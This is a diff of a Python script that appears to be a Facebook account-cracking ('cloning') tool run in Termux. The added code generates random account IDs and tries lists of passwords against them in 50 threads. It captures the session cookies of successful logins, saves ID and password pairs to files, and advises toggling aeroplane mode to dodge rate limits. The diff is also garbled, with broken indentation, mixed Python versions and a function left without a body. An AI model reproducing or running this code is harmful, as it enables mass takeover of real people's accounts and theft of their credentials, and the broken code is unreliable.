@@ -10688,11 +10688,12 @@ jalan("\033[1;93m ▇▇\033[1;92m            Tool Update EveryDay      \033[1;9
 jalan("\033[1;93m ▇▇\033[1;92m        Termux Data Clear EveryDay    \033[1;93m ▇▇")
 jalan("\033[1;93m ▇▇\033[1;92m         Facebook Id -- Rdx       \033[1;93m              ▇▇")
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
-print('\033[1;32m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
-print('Crack process has been completed')
-print('Ids saved in ok.txt,cp.txt')
-print('\033[1;32m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
-
+tl = str(len(user))
+print('\033[1;36m TOTAL IDS: '+tl)
+print('\033[1;36m THE PROCESS HAS BEEN STARTED')
+print('\033[1;31m USE AEROPLANE MOOD IN EVERY 5 MIN ')
+print('\033[1;32m••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+  
 print "\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"
 CorrectUsername = "Rdx"
 CorrectPassword = "Rdx"
@@ -10714,12 +10715,35 @@ while (loop == 'true'):
         os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
 
 print("")
-    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    
+  limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
+  for nmbr in range(limit):
+      nmp = ''.join(random.choice(string.digits) for _ in range(7))
+      user.append(nmp)
+  passx = int(input("[*] Enter Password Limit : "))
+HamiiID = []
+    print("")
+    for bilal in range(passx):
+        pww = input("[*] Enter Password : ")
+        HamiiID.append(pww)
+    with ThreadPool(max_workers=50) as manshera:
+        clear()
+        tl = str(len(user))
+        print('\033[1;36m TOTAL IDS: '+tl)
+        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
+        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 5 MIN ')
+        print('\033[1;32m••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+        for love in user:
+            pwx = [love[1:]]
+            uid = code+love
+            for Eman in HamiiID:
+                pwx.append(Eman)
+            manshera.submit(rcrack,uid,pwx,tl)
+    print('\033[1;32m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+    print('Crack process has been completed')
+    print('Ids saved in ok.txt,cp.txt')
+    print('\033[1;32m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
 
+def rcrack(uid,pwx,tl):
 ##### LICENSE #####
 #=================#
 def lisensi():
@@ -14689,16 +14713,30 @@ def action():
 #					        cpb.append(c+user+pass2)
 																	
 															
-		except:
-			pass
+		     if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('    \033[1;32m[ⓇDX-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                cek_apk(session,coki)
+                open('/sdcard/ⓇDX-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('    \33[1;30m[ⓇDX-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/ⓇDX-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(' %s[ⓇDX-] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.flush()
+    except:
+        pass
+
 		
-	p = ThreadPool(30)
-	p.map(main, id)
-	print 44*'-'
-	print '[✓] Process Has Been Completed ....'
-	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
-	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
-	print """
 \033[1;91m     ♦♦♦———————————————————————————————♦♦♦
 \033[1;91m ,------. ,------. ,--.   ,--. 
 \033[1;91m |  .--. '|  .-.  \ \  `.'  /  
